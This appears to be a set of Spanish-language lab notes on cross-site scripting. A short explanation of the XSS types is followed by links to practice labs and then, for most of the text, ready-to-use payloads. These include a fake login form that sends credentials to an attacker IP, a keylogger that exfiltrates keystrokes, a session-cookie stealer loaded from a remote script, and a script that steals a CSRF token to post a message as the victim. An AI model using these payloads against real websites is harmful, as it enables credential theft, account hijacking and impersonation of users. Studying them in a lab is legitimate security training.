## Introducción

Una vulnerabilidad **XSS** (**Cross-Site Scripting**) es un tipo de vulnerabilidad de seguridad informática que permite a un atacante ejecutar código malicioso en la página web de un usuario sin su conocimiento o consentimiento. Esta vulnerabilidad permite al atacante robar información personal, como nombres de usuario, contraseñas y otros datos confidenciales.

En esencia, un ataque XSS implica la inserción de código malicioso en una página web vulnerable, que luego se ejecuta en el navegador del usuario que accede a dicha página. El código malicioso puede ser cualquier cosa, desde scripts que redirigen al usuario a otra página, hasta secuencias de comandos que registran pulsaciones de teclas o datos de formularios y los envían a un servidor remoto.

Existen varios tipos de vulnerabilidades XSS, incluyendo las siguientes:

- **Reflejado** (**Reflected**): Este tipo de XSS se produce cuando los datos proporcionados por el usuario **se reflejan en la respuesta** HTTP sin ser verificados adecuadamente. Esto permite a un atacante inyectar código malicioso en la respuesta, que luego se ejecuta en el navegador del usuario.
- **Almacenado** (**Stored**): Este tipo de XSS se produce cuando un atacante **es capaz de almacenar código malicioso** en una base de datos o en el servidor web que aloja una página web vulnerable. Este código se ejecuta cada vez que se carga la página.
- **DOM-Based**: Este tipo de XSS se produce cuando el código malicioso **se ejecuta en el navegador del usuario a través del DOM** (Modelo de Objetos del Documento). Esto se produce cuando el código JavaScript en una página web modifica el DOM en una forma que es vulnerable a la inyección de código malicioso.

Los ataques XSS pueden tener graves consecuencias para las empresas y los usuarios individuales. Por esta razón, es esencial que los desarrolladores web implementen medidas de seguridad adecuadas para prevenir vulnerabilidades XSS. Estas medidas pueden incluir la validación de datos de entrada, la eliminación de código HTML peligroso, y la limitación de los permisos de JavaScript en el navegador del usuario.

A continuación, se proporciona el proyecto de Github correspondiente al laboratorio que nos estaremos montando para poner en práctica la vulnerabilidad XSS:

- **secDevLabs**: [https://github.com/globocom/secDevLabs](https://github.com/globocom/secDevLabs)
- **Máquina MyExpense**: [https://www.vulnhub.com/entry/myexpense-1,405/](https://www.vulnhub.com/entry/myexpense-1,405/)

# secDevLabs

## robo de email y password (phishing)

```
<div id="formContainer"></div>

<script>
    var email;
    var password;
    var form = '<form>' +
        'Email: <input type="email" id="email" required>' +
        'Contrasena: <input type="password" id="password" required>' +
        '<input type="button" onclick="submitForm()" value="Enviar">' +
        '</form>';

    document.getElementById("formContainer").innerHTML = form;

    function submitForm() {
        email = document.getElementById("email").value;
        password = document.getElementById("password").value;
        fetch("http://<IP>/?email=" + email + "&password=" + password)
            .then(response => {
                // Maneja la respuesta del servidor si es necesario
                console.log('Formulario enviado con éxito!', response);
            })
            .catch(error => {
                // Maneja cualquier error que haya ocurrido durante la petición fetch
                console.error('Error al enviar el formulario:', error);
            });
    }
</script>
```

## Keylogger

```
<script>
var k = "";
document.onkeypress = function(e){
  e = e || window.event;
  k += e.key;
  var i = new Image();
  i.src = "http://<IP>/" + k;
};
</script>
```

Comando para ponernos en escucha:
```
python3 -m http.server 80 2>&1 | grep -oP 'GET /\K[^.*\s]+'
```


## Redirect

```
<script>
window.location.href="<url>";
</script>
```

## Robar cookie de sesión

```
<script src="http://192.168.111.45/test.js"></script>
```
creas un archivo test.js:
```
var request = new XMLHttpRequest();
request.open('GET', 'http://<IP>/?cookie=' + document.cookie);
request.send();
```

## crear un post sin que el usuario se entere

```
<script src="http://192.168.111.45/test.js"></script>
```

creas un archivo test.js:


```
var domain = "http://localhost:10007/newgossip";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.withCredentials = true;
req1.send();

var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementsByName('_csrf_token')[0].value;

var req2 = new XMLHttpRequest();
var data = "title=%HA20jefe%20es%20un%20in%C3%BAtil&subtitle=JEFE%20CABRONAZO&text=Odio%20a%20mi%20equipo%2C%20el%20trabajo%20y%20mi%20jefe%20es%20un%20cabron.%20No%20me%20sube%20el%20sueldo%3B&_csrf_token=" + token;
req2.open('POST', "http://localhost:10007/newgossip", false);
req2.withCredentials = true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.send(data);
```


# Máquina MyExpense
